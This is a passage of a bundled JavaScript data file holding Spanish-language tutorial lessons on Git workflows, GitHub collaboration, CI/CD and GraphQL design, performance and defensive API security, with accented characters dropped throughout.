3. Intenta hacer merge. Git te dir "deleted by us, modified by them".
4. Decide: Mantienes la eliminacin o restauras el archivo modificado? Resulvelo y termina el commit.
`,completed:!0},{id:"git-09-buenas-practicas",title:"Buenas Prcticas de Commits",level:"semi-senior",content:`# Leccin 9: Buenas Prcticas de Commits (El Arte de la Bitcora)

Un historial de Git limpio cuenta una historia. Un historial sucio es basura forense.

## 1. Commits Atmicos
Cada commit debe hacer **una sola cosa** y hacerla completa.
*    Commit Gigante: "Arregla login, cambia color del footer, aade librera de mapas y actualiza el README". (Si el mapa falla y hay que revertir, pierdes tambin el arreglo del login).
*    Commit Atmico 1: "Fix: validacin de email en login".
*    Commit Atmico 2: "Style: cambia footer a dark mode".

Si rompes algo, revertir un commit atmico es fcil y seguro.

## 2. El Mensaje Perfecto (Estndar de la Industria)
Usa el formato **Conventional Commits**.
Estructura: \`tipo(alcance): descripcin corta\`

Tipos comunes:
*   \`feat\`: Nueva funcionalidad.
*   \`fix\`: Arreglo de bug.
*   \`docs\`: Cambios en documentacin.
*   \`style\`: Formato (espacios, comas) que no afecta lgica.
*   \`refactor\`: Cambio de cdigo que no aade features ni arregla bugs (limpieza).
*   \`test\`: Aadir tests faltantes.
*   \`chore\`: Tareas de mantenimiento (actualizar dependencias).

Ejemplo: \`feat(auth): agrega botn de login con Google\`

## 3. No subas basura (\`.gitignore\`)
Nunca subas:
*   \`node_modules/\` (JAMS!)
*   Archivos \`.env\` con contraseas (Seguridad crtica).
*   Archivos de build (\`dist/\`, \`build/\`).
*   Archivos de sistema (\`.DS_Store\`, \`Thumbs.db\`).

Configura siempre un archivo \`.gitignore\` en la raz de tu proyecto.

---

### Misin Semi-Senior:
Revisa el ltimo proyecto en el que trabajaste.
1. Tienes commits tipo "cambios finales"?
2. Crea un archivo \`.gitignore\` robusto para ese tipo de proyecto (busca "gitignore generator" en Google).
3. Escribe tus prximos 5 commits usando estrictamente Conventional Commits.
`,completed:!0},{id:"git-10-git-flow",title:"Git Flow y Estrategias",level:"semi-senior",content:'# Leccin 10: Git Flow y Estrategias de Ramas\n\nTrabajar solo es fcil. Trabajar con 20 personas requiere reglas estrictas de trfico.\n\n## 1. Git Flow (El Clsico Robusto)\nDiseado por Vincent Driessen. Ideal para software con "Lanzamientos" versionados (v1.0, v1.1).\n*   **Ramas Eternas:**\n    *   `main`: Solo cdigo de produccin. Estable.\n    *   `develop`: Donde se integra todo el trabajo nuevo. Inestable.\n*   **Ramas Temporales:**\n    *   `feature/*`: Salen de `develop`, vuelven a `develop`.\n    *   `release/*`: Salen de `develop` para congelar una versin, van a `main` y `develop`.\n    *   `hotfix/*`: Salen de `main` (emergencia), vuelven a `main` y `develop`. (El nico caso donde tocas main directamente).\n\n## 2. GitHub Flow (El gil Moderno)\nIdeal para Web Apps con despliegue continuo (CI/CD) donde se sube a produccin varias veces al da.\n*   `main`: Siempre desplegable.\n*   `feature-branch`: Creas una rama para **cualquier** cosa.\n*   Haces Pull Request.\n*   Se discute, revisa y aprueba.\n*   Merge a `main` -> Despliegue automtico!\n\n## 3. Trunk Based Development\nLo que usan Google y Facebook.\n*   No hay ramas de larga duracin.\n*   Todos commitean a `main` (trunk) directamente o con ramas de vida muy corta (< 1 da).\n*   Requiere tests automticos muy fuertes para no romper todo.\n\n---\n\n### Misin Semi-Senior:\nDibuja en un papel el flujo de un `hotfix` en Git Flow:\n1. Detectan bug en Prod (`main`).\n2. Creas rama `hotfix/bug-critico` desde `main`.\n3. Arreglas.\n4. Merge a `main` (para arreglar prod).\n5. Merge a `develop` (para que el arreglo tambin est en la prxima versin).\n6. Borras la rama `hotfix`.\nEntender este "bifurcar y converger" es la clave de la gestin de releases.\n',completed:!0},{id:"git-11-pull-requests",title:"Pull Requests (GitHub)",level:"semi-senior",content:`# Leccin 11: GitHub Profesional - Pull Requests (PR)

El Pull Request es el corazn de la colaboracin moderna. No es solo "pedir permiso para fusionar", es un foro de discusin tcnica.

## 1. El Ciclo de Vida de un PR
1.  **Push:** Subes tu rama a GitHub.
2.  **Open PR:** Creas la solicitud. "Quiero meter mi rama \`feature-x\` en \`main\`".
3.  **CI Checks:** Robots automticos verifican tu cdigo (Tests, Linting). Si falla rojo, nadie revisa.
4.  **Review:** Humanos leen tu cdigo, hacen preguntas y piden cambios.
5.  **Iteracin:** Haces nuevos commits en tu rama para arreglar lo que te pidieron. El PR se actualiza solo.
6.  **Approval:** Te dan luz verde ("LGTM" - Looks Good To Me).
7.  **Merge:** Fusionas y cierras.

## 2. Cmo escribir una Descripcin de PR
Un PR vaco es una falta de respeto al revisor.
Plantilla Profesional:
*   **Resumen:** Qu hace esto?
*   **Contexto:** Por qu era necesario? (Link al ticket/issue).
*   **Screenshots/Gifs:** Si es visual, muestra el antes y despus.
*   **Pasos para probar:** Cmo puede el revisor verificar que funciona?

## 3. Draft PRs
Si no has terminado pero quieres feedback temprano, abre el PR como "Draft" (Borrador). GitHub no dejar hacer merge, pero avisa a tu equipo de que ests trabajando en ello y permite comentarios preliminares.

---

### Misin Semi-Senior:
Abre un Pull Request en un repositorio de prueba (necesitars pushear a GitHub).
Usa Markdown en la descripcin. Inserta una imagen. Menciona un problema usando \`#1\` (si existe el issue 1). Pide a un amigo (o a ti mismo con otra cuenta) que te deje un comentario.
`,completed:!0},{id:"git-12-code-review",title:"Code Review",level:"semi-senior",content:`# Leccin 12: Code Level (Code Review)

Revisar cdigo es tan importante como escribirlo. Es el filtro de calidad y la herramienta #1 de aprendizaje en equipo.

## 1. Como Revisor (Reviewer)
Tu trabajo no es encontrar errores de sintaxis (eso lo hace el linter), sino errores de diseo y lgica.
*   **S amable:** Critica al cdigo, no a la persona.
    *    "Esto est mal hecho".
    *    "Has considerado qu pasa si esta variable es null? Podra causar un crash".
*   **Prioriza:** No bloquees un PR por un espacio en blanco. Bloqualo por un fallo de seguridad o un bug crtico.
*   **Pregunta:** "No entiendo esta lnea" es un comentario vlido. Si t no lo entiendes, el cdigo no es claro.

## 2. Como Autor (Author)
*   **No te tomes nada personal:** Estn ayudando a que tu cdigo sea mejor.
*   **S tu primer revisor:** Antes de abrir el PR, lee tu propio "diff". Te sorprender cuntos errores obvios encuentras t mismo.
*   **Responde a todo:** Si aceptas un cambio, di "Hecho". Si no ests de acuerdo, explica por qu tcnicamente.

## 3. Nitpicks (Detalles menores)
Usa prefijos para aclarar la severidad:
*   \`[NIT]\` (Nitpick): "Sugerencia menor, no bloqueante (ej: cambiar nombre de variable)".
*   \`[BLOCKER]\`: "Error grave, no se puede fusionar as".
*   \`[QUESTION]\`: "Duda genuina".

---

### Misin Semi-Senior:
Busca un proyecto Open Source en GitHub. Entra a la pestaa "Pull Requests". Lee los comentarios de una revisin activa. Observa el tono, qu piden y cmo interactan. Aprende copiando el estilo de los grandes proyectos.
`,completed:!0},{id:"git-13-issues-projects",title:"Issues y Projects",level:"semi-senior",content:`# Leccin 13: Issues y Projects (Gestin en GitHub)

GitHub no es solo para cdigo. Es una herramienta completa de gestin de proyectos (Project Management).

## 1. Issues (Problemas / Tareas)
Un Issue es un ticket de trabajo. Puede ser:
*   Un reporte de Bug.
*   Una solicitud de Feature.
*   Una pregunta.

**Labels (Etiquetas):** Clasifican los issues.
*   \`bug\`: Algo est roto.
*   \`enhancement\`: Nueva funcionalidad.
*   \`good first issue\`: Ideal para juniors o contribuidores nuevos.

**Assignees:** Quin es responsable de esto?

## 2. GitHub Projects (Tableros)
Un tablero tipo Kanban (como Trello o Jira) integrado en GitHub.
Columnas tpicas:
*   **Backlog:** Todo lo que queremos hacer algn da.
*   **Todo:** Lo seleccionado para este sprint.
*   **In Progress:** Lo que se est programando ahora.
*   **Review:** En PR.
*   **Done:** Mergeado en main.

La ventaja es la **automatizacin**: Puedes configurar que cuando un PR se abra, la tarjeta se mueva sola a "In Progress", y cuando se cierre, a "Done".

## 3. Milestones (Hitos)
Agrupan issues con una fecha lmite. Ej: "Lanzamiento Beta v1.0 (30 de Julio)". Te da una barra de progreso de cunto falta para completar esa meta.

---

### Misin Semi-Senior:
Crea un "Project" en tu repositorio. Configura un tablero Kanban bsico.
Crea 3 issues con diferentes labels.
Asocia los issues al proyecto.
Mueve un issue de "Todo" a "Done" y siente la satisfaccin del deber cumplido.
`,completed:!0},{id:"git-14-ci-cd-basico",title:"CI/CD Bsico",level:"semi-senior",content:`# Leccin 14: CI/CD Bsico con GitHub Actions

El "Santo Grial" de la ingeniera moderna: Automatizar todo.
*   **CI (Continuous Integration):** Integrar cdigo frecuentemente y verificar que no rompa nada (Tests automticos).
*   **CD (Continuous Deployment):** Si los tests pasan, subir a produccin automticamente.

## 1. Qu es GitHub Actions?
Es un robot integrado en GitHub. T le das instrucciones (en archivos YAML) y l las ejecuta cuando pasa algo (un push, un PR, u horario programado).

## 2. Tu primer Workflow \`.github/workflows/main.yml\`
Un archivo simple que corre tests cada vez que alguien hace push.

\`\`\`yaml
name: CI Robot

on: [push] # Cundo correr? En cada push

jobs:
  build-and-test:
    runs-on: ubuntu-latest # Dnde correr? (Mquina virtual de Linux)
    
    steps:
    - name: Descargar cdigo
      uses: actions/checkout@v3

    - name: Instalar Node.js
      uses: actions/setup-node@v3
      with:
        node-version: 18

    - name: Instalar dependencias
      run: npm install

    - name: Correr tests
      run: npm test
\`\`\`

## 3. El resultado
Cuando subas cdigo, vers un puntito amarillo (ejecutando) al lado de tu commit en GitHub.
*    Verde: Todo bien. Tests pasaron.
*    Rojo: Rompiste algo. Recibirs un email de "Build Failed" (la vergenza pblica).

Esto impide que cdigo roto llegue a produccin (si configuras reglas para prohibir merge con rojo).

---

### Misin Semi-Senior:
Crea la carpeta \`.github/workflows\` en tu repo.
Aade un archivo \`ci.yml\` simple que solo imprima "Hola Mundo" en la consola (\`run: echo "Hola Mundo"\`).
Haz push y ve a la pestaa "Actions" en GitHub para verlo correr en vivo en los servidores de Microsoft.
`,completed:!0},{id:"git-15-estrategias-empresariales",title:"Estrategias Empresariales",level:"senior",content:`# Leccin 15: Estrategias de Git Empresarial

Cuando tu organizacin tiene 500 ingenieros, "hacer un commit" deja de ser trivial. Como Senior, diseas la arquitectura del flujo de trabajo.

## 1. Governance y Branch Policies
No puedes confiar en la buena voluntad. Debes **imponer** reglas en GitHub/GitLab.
*   **Branch Protection Rules (Main):**
    *   \`Require pull request reviews before merging\`: Mnimo 2 aprobaciones de Seniors.
    *   \`Require status checks to pass\`: Si CI falla (tests rojos, lint errors), el botn de merge se bloquea fsicamente.
    *   \`Require signed commits\`: Para auditora (GPG signatures).
*   **Codeowners:** Archivo especial \`.github/CODEOWNERS\`. Define quin es "dueo" de cada carpeta. Si tocas \`/pagos\`, automticamente se pide review al equipo \`@billing-team\`.

## 2. Trunk-Based Development a Escala
Empresas como Google o Amazon no usan Git Flow. Usan TBD.
*   **Feature Flags:** Todo va a \`main\`. Si la feature no est lista, se envuelve en un \`if (FEATURE_FLAG_X)\`. Esto permite tener cdigo "a medio hacer" en produccin sin que nadie lo vea.
*   **Deploy Trains:** El despliegue a produccin sale a horas fijas (ej: cada hora), como un tren. Si tu cdigo entr, se va. Si rompiste el tren, detienes a toda la empresa (presin social positiva).

## 3. InnerSource
Aplicar prcticas de Open Source *dentro* de la empresa.
*   Cualquier equipo puede contribuir al repositorio de otro equipo mediante PRs, en lugar de pedir que lo hagan y esperar meses.
*   Requiere documentacin excelente y tests robustos en todos los repos.

---

### Misin Senior:
Configura en un repo de GitHub una regla de proteccin para \`main\`:
1. Exige que pasen los checks de CI.
2. Exige review de Codeowners.
3. Intenta hacer un push directo a \`main\` y observa cmo te rechaza el sistema. Explica a tu equipo (imaginario) por qu esto es bueno y no burocracia.
`,completed:!0},{id:"git-16-monorepos",title:"Monorepos",level:"senior",content:`# Leccin 16: Monorepons vs. Polyrepos

Debemos tener 50 repositorios pequeos o un repositorio gigante de 10GB? La decisin arquitectnica ms divisiva.

## 1. Polyrepos (Multi-repo)
Cada microservicio o librera tiene su propio repo.
*   **Pros:** Aislamiento total. Repo pequeo y rpido. Control de acceso granular.
*   **Contras:** Infierno de dependencias. Para actualizar una librera compartida, debes hacer PR en 50 repositorios. Difcil ver cambios "cross-cutting".

## 2. Monorepo
Todo el cdigo de la empresa (Frontend, Backend, Libreras, Infra) en UN solo repo.
*   **Ejemplos:** Google, Facebook, Twitter, Uber.
*   **Pros:** Refactorizacin atmica (cambias la API y el Cliente en el mismo commit). Cdigo compartido trivial. Un solo CI.
*   **Contras:** Git se vuelve lento (necesitas herramientas especiales). Tiempos de Build eternos si no eres inteligente.
*   **Herramientas:** Turborepo, Nx, Bazel, Lerna.

## 3. Workspaces (npm/yarn/pnpm)
Cmo manejar dependencias en un Monorepo JS/TS.
*   Tienes una carpeta \`packages/ui\` y otra \`apps/web\`.
*   \`apps/web\` importa \`packages/ui\` como si fuera una librera externa, pero es un symlink local.
*   Cambias algo en \`ui\` y \`web\` lo ve al instante.

---

### Misin Senior:
Crea una estructura de Monorepo bsica con npm workspaces:
*   \`/packages/shared-utils\` (funcin suma)
*   \`/apps/api\` (usa suma)
*   \`/apps/frontend\` (usa suma)
Configura \`package.json\` para que el root instale todas las dependencias. Demuestra cmo cambiar \`shared-utils\` afecta a ambos consumidores inmediatamente.
`,completed:!0},{id:"git-17-hooks",title:"Git Hooks y Automatizacin",level:"senior",content:`# Leccin 17: Git Hooks (Automatizacin Local)

Antes de que el cdigo llegue a GitHub (CI), puedes interceptarlo en la mquina del desarrollador.

## 1. Qu son los Hooks?
Scripts que Git ejecuta automticamente antes o despus de eventos eventos como \`commit\`, \`push\`, \`merge\`.
Viven en \`.git/hooks\`.

## 2. Hooks ms usados
*   \`pre-commit\`: Se ejecuta al hacer \`git commit\`. Ideal para Linters (Prettier, ESLint). Si el cdigo est feo, el commit falla y no se guarda.
*   \`commit-msg\`: Verifica que el mensaje siga el estndar (Conventional Commits). Si escribes "fix", te rechaza.
*   \`pre-push\`: Corre los tests unitarios antes de subir al servidor.

## 3. Husky y Lint-staged
Configurar hooks a mano (bash scripts) es tedioso. En JS usamos **Husky**.
Y para que no sea lento, usamos **lint-staged**: Solo corre el linter en los archivos que *cambiaron* (staged), no en todo el proyecto.

*Configuracin tpica en package.json:*
\`\`\`json
"husky": {
  "hooks": {
    "pre-commit": "lint-staged"
  }
}
\`\`\`

---

### Misin Senior:
Instala \`husky\` en tu proyecto.
Configura un hook \`pre-commit\` que impida hacer commit si hay un \`console.log\` en el cdigo.
Intenta commitear un \`console.log\`. Si Husky te grita y detiene el commit, has logrado automatizar la calidad.
`,completed:!0},{id:"git-18-automatizacion",title:"Automatizacin Avanzada",level:"senior",content:`# Leccin 18: Automatizacin Avanzada (GH Actions Scripting)

Llevar CI/CD al siguiente nivel: Infraestructura como Cdigo y Bots.

## 1. Matrices de Estrategia
Tu librera funciona en Node 14, 16 y 18? En Linux y Windows?
No escribas 6 jobs. Usa una matriz.

\`\`\`yaml
strategy:
  matrix:
    node: [14, 16, 18]
    os: [ubuntu-latest, windows-latest]
\`\`\`
GitHub generar 6 jobs en paralelo combinando todo.

## 2. Automatizacin de Releases (Semantic Release)
Herramienta que lee tus Conventional Commits y automticamente:
1.  Calcula la nueva versin (SemVer): Fue un \`fix\`? Sube patch. Fue \`feat\`? Sube minor.
2.  Genera el CHANGELOG.md.
3.  Crea el Git Tag y Release en GitHub.
4.  Publica el paquete a npm.
Todo esto sin intervencin humana al hacer merge a \`main\`.

## 3. Bots de GitHub
Puedes programar scripts que comenten en PRs.
*   Ejemplo: Un bot que analiza el costo de la nube de tus cambios de Terraform y comenta: "Este PR aumentar la factura AWS en $50/mes".
*   Ejemplo: Un bot que felicita a los, contribuidores primerizos.

---

### Misin Senior:
Configura un Workflow que use una matriz para correr tests en Node 18 y Node 20.
Aade un paso condicional: Si el commit es en \`main\`, despliega (simulado con un echo). Si es en una rama, solo testea.
`,completed:!0},{id:"git-19-equipos-grandes",title:"Equipos Grandes (GitOps)",level:"senior",content:`# Leccin 19: Gestin de Equipos Grandes (GitOps)

Cuando el equipo crece, "pedirle a Juan que despliegue" no escala. La infraestructura debe ser declarativa y vivir en Git.

## 1. Qu es GitOps?
**Git como nica fuente de verdad para la infraestructura.**
Si quieres cambiar la CPU del servidor, no entras a la consola de AWS. Cambias un archivo YAML en Git ("infra-repo"), haces PR, y un operador (como ArgoCD o Flux) sincroniza el estado real con Git. Si alguien cambia algo manual en AWS, el operador lo revierte automticamente.

## 2. Gestin de Secretos
JAMS subas \`.env\` o keys a Git. Ni siquiera en repos privados.
*   **Solucin:** Vaults (HashiCorp Vault, AWS Secrets Manager, GitHub Secrets).
*   En Git solo subes referencias cifradas o inyectas los secretos en tiempo de CI/CD.

## 3. DORA Metrics
Para medir si tu equipo de ingeniera es de elite (Seniority Organizacional), mides 4 cosas:
1.  **Deployment Frequency:** Cuntas veces despliegas al da? (Elite: Mltiples veces).
2.  **Lead Time for Changes:** Tiempo desde el commit hasta produccin. (Elite: < 1 hora).
3.  **Change Failure Rate:** Qu % de deploys rompen algo? (Elite: < 5%).
4.  **Time to Restore Service:** Cuando se rompe, cunto tardas en arreglarlo? (Elite: < 1 hora).

Git es la fuente de datos para calcular estas mtricas.

---

### Misin Senior:
Implementa conceptualmente GitOps.
1. Tienes un repo \`app-code\` y otro \`app-config\`.
2. Simula un cambio de configuracin (ej: aumentar rplicas de 2 a 5).
3. Haz el cambio en un archivo YAML en \`app-config\`.
4. Explica cmo un sistema automatizado detectara ese commit y aplicara el cambio en el cluster sin intervencin humana.
`,completed:!0}]},tv={id:"graphql",title:"GraphQL Moderno",description:"Domina el lenguaje de consulta para APIs que est revolucionando la forma en que el Frontend y el Backend se comunican.",completed:!1,track:"Especializacin para Desarrolladores",lessons:[{id:"graphql-01-intro-graphql",title:"Qu es GraphQL y por qu existe?",level:"junior",content:`# Leccin 01: Qu es GraphQL y por qu existe?

**GraphQL** es un lenguaje de consulta para APIs y un tiempo de ejecucin para completar esas consultas con tus datos existentes. Fue creado por Facebook para solucionar los problemas de las APIs REST tradicionales.

## 1. El gran problema: Over-fetching y Under-fetching
En **REST**, el servidor decide qu datos enviarte. 
*   **Over-fetching:** Pides un usuario y el servidor te devuelve 50 campos, aunque solo necesites el nombre. Gastas datos y memoria.
*   **Under-fetching:** Pides un usuario, pero para ver sus posteos tienes que hacer OTRA peticin a \`/users/1/posts\`. Esto hace que las Apps sean lentas.

**GraphQL soluciona esto:** El cliente (el Frontend) pide exactamente lo que necesita, y nada ms.

## 2. Comparacin Rpida

| Caracterstica | REST | GraphQL |
| :--- | :--- | :--- |
| **Endpoints** | Mltiples (\`/users\`, \`/posts\`) | Uno solo (normalmente \`/graphql\`) |
| **Datos** | El servidor decide la forma | El cliente decide la forma |
| **Versiones** | \`v1\`, \`v2\`, etc. | No necesita versiones (es evolutivo) |

---

### Concepto Junior:
GraphQL no es una base de datos nueva. Es una "capa" que se pone encima de tu servidor para que pedir datos sea mucho ms eficiente y flexible para el Frontend.
`,completed:!1},{id:"graphql-02-queries-mutations",title:"Queries y Mutations - Hablando con el Servidor",level:"junior",content:`# Leccin 02: Queries y Mutations - Hablando con el Servidor

En GraphQL tenemos dos formas principales de interactuar con los datos.

## 1. Queries (Consultas)
Se usan para **leer** datos. Es el equivalente al \`GET\` de REST.
\`\`\`graphql
query {
  user(id: "123") {
    name
    email
    posts {
      title
    }
  }
}
\`\`\`
Fjate cmo pedimos el usuario y sus posts en una sola peticin. Adis al Under-fetching!

## 2. Mutations (Mutaciones)
Se usan para **modificar** datos (crear, actualizar, borrar). Equivalen a \`POST\`, \`PUT\`, \`PATCH\` y \`DELETE\`.
\`\`\`graphql
mutation {
  createPost(title: "Mi primer post", content: "Hola mundo") {
    id
    createdAt
  }
}
\`\`\`
Lo genial de las mutaciones es que puedes pedir que te devuelvan el objeto recin creado en la misma operacin.

## 3. Campos y Argumentos
Cada campo en GraphQL puede recibir argumentos (como el \`id\` en el ejemplo de arriba), lo que permite filtrar, buscar y ordenar de forma nativa.

---

### Misin Junior:
Entender que en GraphQL, la "forma" de tu peticin es idntica a la "forma" de la respuesta que vas a recibir. Si pides un nombre, recibes un objeto con la clave \`name\`.
`,completed:!1},{id:"graphql-03-schemas-tipos",title:"Schemas y el Sistema de Tipos",level:"semi-senior",content:`# Leccin 03: Schemas y el Sistema de Tipos

Como Semi-Senior, ya no solo "pides datos", ahora diseas cmo se estructuran esos datos usando el **Schema Definition Language (SDL)**.

## 1. Tipos de Objetos
El Schema es el contrato entre el cliente y el servidor. Define qu se puede preguntar.
\`\`\`graphql
type User {
  id: ID!
  username: String!
  age: Int
  posts: [Post]
}
\`\`\`
*   \`!\`: Significa que el campo es **obligatorio** (no puede ser nulo).
*   \`[Post]\`: Significa que es una **lista** de objetos tipo Post.

## 2. Los tipos raz (Root Types)
Todo Schema de GraphQL debe tener al menos un tipo \`Query\`:
\`\`\`graphql
type Query {
  me: User
  allUsers: [User]
}
\`\`\`

## 3. Strong Typing (Tipado Fuerte)
GraphQL valida los tipos automticamente. Si envas un String donde se esperaba un Int, el servidor rechazar la peticin sin que t tengas que escribir cdigo extra de validacin.

---

### Lo que hace un Semi-Senior:
Disea Schemas pensando en la usabilidad del Frontend. No copia la base de datos tal cual, sino que crea capas de abstraccin para que el API sea limpia y fcil de entender.
`,completed:!1},{id:"graphql-04-resolvers",title:"Resolvers - Donde vive la lgica",level:"semi-senior",content:`# Leccin 04: Resolvers - Donde vive la lgica

El Schema dice qu se puede pedir, pero el **Resolver** es la funcin que realmente va a buscar los datos a la DB o a otro API.

## 1. Estructura de un Resolver
Un resolver suele recibir 4 argumentos: \`(parent, args, context, info)\`.
\`\`\`javascript
const resolvers = {
  Query: {
    user: async (parent, { id }, context) => {
      // Hablamos con la base de datos
      return await db.User.findById(id);
    }
  }
};
\`\`\`

## 2. El Contexto (\`context\`)
El objeto \`context\` es compartido por todos los resolvers. Es el lugar perfecto para poner:
*   La conexin a la base de datos.
*   La informacin del usuario autenticado.

## 3. Resolvers de Campo
Puedes crear resolvers para campos especficos. Por ejemplo, si el Schema tiene un campo \`fullName\` pero en la DB solo tienes \`name\` y \`lastName\`, puedes crear un resolver que los una.

---

### Misin Semi-Senior:
Aprender que cada campo en GraphQL puede tener su propio resolver. Esto permite que los datos de un mismo objeto vengan de diferentes bases de datos o servicios sin que el cliente se de cuenta.
`,completed:!1},{id:"graphql-05-autenticacion-seguridad",title:"Autenticacin y Seguridad en GraphQL",level:"semi-senior",content:`# Leccin 05: Autenticacin y Seguridad en GraphQL

Proteger un API de GraphQL es un poco diferente a REST porque todos los "endpoints" son en realidad uno solo.

## 1. Dnde autenticar
No autentiques dentro de cada resolver.
*   **Mejor prctica:** Usa un middleware antes de llegar a GraphQL para verificar el Token (JWT). Si el usuario es vlido, lo pones en el \`context\`.
*   Luego, el resolver solo mira el \`context\` para ver si tiene permiso.

## 2. El peligro de la profundidad
En GraphQL un atacante podra enviar una consulta maliciosa pidiendo: un usuario -> sus posts -> los autores de los comentarios de esos posts -> sus posteos -> etc.
*   **Solucin:** Usa herramientas para limitar la **Query Depth** (profundidad) y evitar que el servidor colapse.

## 3. Manejo de Errores
GraphQL siempre devuelve un status \`200 OK\` si el servidor respondi, aunque haya fallado la bsqueda. Debes mirar el campo \`errors\` en la respuesta JSON para saber si algo sali mal.

---

### Verdad Tcnica:
"En GraphQL, la seguridad es granular". No solo proteges la URL, proteges el acceso a tipos de datos y campos especficos segn el rol del usuario.
`,completed:!1},{id:"graphql-06-practica-graphql",title:"Prctica y Evaluacin: GraphQL Profesional",level:"semi-senior",content:`# Prctica y Evaluacin: GraphQL Profesional

Demuestra que sabes disear y consultar APIs modernas.

---

## 1. Ejercicio Junior: Mi Primera Query
**Consigna:** Tienes un servidor de una red social. Quieres obtener tu perfil (nombre y biografa) y el ttulo de tus ltimos 3 posts en una sola peticin.
Escribe cmo se vera esa Query.

## 2. Ejercicio Semi-Senior: Diseador de Schemas
**Escenario:** Vas a crear un sistema para una Librera. Cada \`Libro\` tiene un ttulo, un autor y un nmero de pginas. Cada \`Autor\` tiene un nombre y una lista de sus libros.
*Consigna:* Escribe el Schema (DSL) definiendo los tipos \`Book\` y \`Author\` con sus relaciones.

## 3. Evaluacin de Conceptos
*   Qu es el **Over-fetching** y cmo lo soluciona GraphQL?
*   Para qu sirve el objeto \`context\` en un Resolver?
*   Por qu es peligroso no limitar la profundidad de las consultas en un API pblica?

---

### Resultado esperado:
Capacidad para razonar sobre el flujo de datos y la seguridad en entornos de APIs evolutivas. 
`,completed:!1,isProject:!0},{id:"graphql-07-performance-avanzada",title:"Performance Avanzada - El problema N+1 y DataLoaders",level:"senior",content:`# Leccin 07: Performance Avanzada - El problema N+1 y DataLoaders

En el nivel Senior, no basta con que GraphQL funcione; debe ser extremadamente eficiente. El error ms comn que destruye la performance es el problema **N+1**.

## 1. El Problema N+1
Imagina que pides una lista de 10 usuarios y sus ltimos 5 posts.
1.  GraphQL hace **1 consulta** para traer los 10 usuarios.
2.  Luego, por cada usuario, hace **otra consulta** para traer sus posts.
3.  **Resultado:** 1 + 10 = 11 consultas a la base de datos para una sola peticin. Si tienes 100 usuarios, son 101 consultas. Esto mata tu base de datos.

## 2. La Solucin: DataLoaders
**DataLoader** es una librera creada por Facebook que aplica dos tcnicas:
*   **Batching:** Espera un milisegundo a que todos los resolvers pidan sus datos, los junta en una sola lista (batch) y hace **UNA sola consulta** SQL \`WHERE id IN (...)\`.
*   **Caching:** Si dos partes de la query piden el mismo usuario, DataLoader devuelve el resultado de la memoria en lugar de ir a la DB de nuevo.

## 3. Persisted Queries
En lugar de enviar un String gigante con la query por la red, el cliente enva solo un **Hash** (identificador). El servidor ya tiene guardada la query asociada a ese hash. Esto ahorra ancho de banda y mejora la seguridad.

---

### Visin Senior:
"Un API GraphQL sin DataLoaders es una bomba de tiempo para tu base de datos". Dominar el batching es la diferencia entre un prototipo y un sistema de produccin escalable.
`,completed:!1},{id:"graphql-08-seguridad-audit",title:"Seguridad y Auditora Senior",level:"senior",content:`# Leccin 08: Seguridad y Auditora Senior

GraphQL expone muchsima informacin por su naturaleza auto-documentada. Debemos ser quirrgicos al cerrar las puertas a posibles atacantes.

## 1. Deshabilitar la Introspeccin en Produccin
La introspeccin permite que herramientas como Apollo Sandbox lean todo tu Schema.
*   **Junior:** Lo deja prendido.
*   **Senior:** Lo apaga en produccin para que nadie pueda "mapear" los puntos dbiles de tu API sin permiso.

## 2. Query Cost Analysis (Anlisis de Costo)
En lugar de solo limitar la profundidad, asignamos un "costo" a cada campo.
*   Campo \`nombre\`: 1 punto.
*   Campo \`amigos\`: 10 puntos (porque requiere un join complejo).
Si el usuario enva una query que suma ms de 100 puntos, el servidor la rechaza antes de empezar a procesarla.

## 3. Rate Limiting por Operacin
En REST limitamos por IP y URL. En GraphQL, limitamos por la complejidad de la consulta. Puedes usar herramientas como \`graphql-rate-limit\` para definir estas reglas directamente en tu Schema.

---

### Misin Senior:
Manejar la seguridad como una cebolla: capas de validacin de tokens, seguidas de lmites de profundidad, anlisis de costo y finalmente permisos granulares en cada resolver.
`,completed:!1},{id:"graphql-09-apollo-federation",title:"Arquitectura de Supergraphs con Apollo Federation",level:"senior",content:`# Leccin 09: Arquitectura de Supergraphs con Apollo Federation

Qu pasa cuando tu empresa crece tanto que un solo Schema de GraphQL se vuelve inmanejable? Entramos en el mundo de los **Micro-servicios con GraphQL**.

## 1. El concepto de Federation
**Apollo Federation** permite dividir tu Schema en mltiples servicios independientes (Subgraphs), pero que el cliente los vea como un solo API unificado (Supergraph).
*   El **Servicio de Usuarios** maneja los datos bsicos.
*   El **Servicio de Productos** maneja el catlogo.
*   El **Gateway** (o Router) recibe la query, la descompone y le pide a cada microservicio su parte.

## 2. Definicin de Entidades
En Federation, un servicio puede extender un tipo definido en otro servicio.
*   Ejemplo: El servicio de \`Reviews\` puede agregar un campo \`rating\` al tipo \`Product\` que vive en el servicio de \`Inventory\`.

## 3. Beneficios Senior
*   **Independencia de equipos:** El equipo de Pagos puede desplegar sus cambios sin miedo a romper el servicio de Auth.
*   **Escalabilidad:** Cada subgraph puede escalar de forma independiente segn su carga.

---

### Visin Arquitectnica:
"No pases a Federation si tu equipo es de 3 personas. Es una herramienta poderosa para resolver problemas organizativos de grandes empresas; no agregues complejidad si el Monolito an te sirve".
`,completed:!1},{id:"graphql-10-casos-reales-senior",title:"Casos Reales y Trade-offs en Produccin",level:"senior",content:`# Leccin 10: Casos Reales y Trade-offs en Produccin

Los planos son lindos, pero la realidad del trfico masivo es otra. Vamos a analizar cmo las grandes empresas usan GraphQL.

## 1. El caso de GitHub
GitHub expone casi todo su API pblica en GraphQL. 
*   **Decisin:** Obligan a usar paginacin por cursores (no por pginas) para asegurar que las queries sean siempre predecibles.
*   **Trade-off:** Es ms difcil para un desarrollador novato usar el API, pero el servidor es mucho ms estable.

## 2. El caso de Netflix
Netflix usa Federation para unir cientos de microservicios.
*   **Leccin:** Han desarrollado herramientas internas para visualizar cmo fluye la data entre subgraphs para detectar cuellos de botella antes de que afecten al usuario.

## 3. Cundo NO usar GraphQL
No eres un Senior si intentas usar GraphQL para todo:
*   **Transferencia de Archivos:** REST o gRPC son mucho mejores para subir/bajar archivos pesados.
*   **APIs muy simples:** Si tu App solo tiene 3 tablas y 5 pantallas, GraphQL agregar una complejidad innecesaria.

---

### Verdad de la industria:
"Un Senior elige GraphQL no porque sea 'cool', sino porque los beneficios de agilidad en el Frontend superan el costo de mantenimiento en el Backend".
`,completed:!1},{id:"graphql-11-practica-senior-graphql",title:"Arquitecto GraphQL Senior",level:"senior",content:`# Ejercicios y Evaluacin: Arquitecto GraphQL Senior

Demuestra que puedes disear sistemas de escala mundial.

---

## 1. El Desafo del N+1
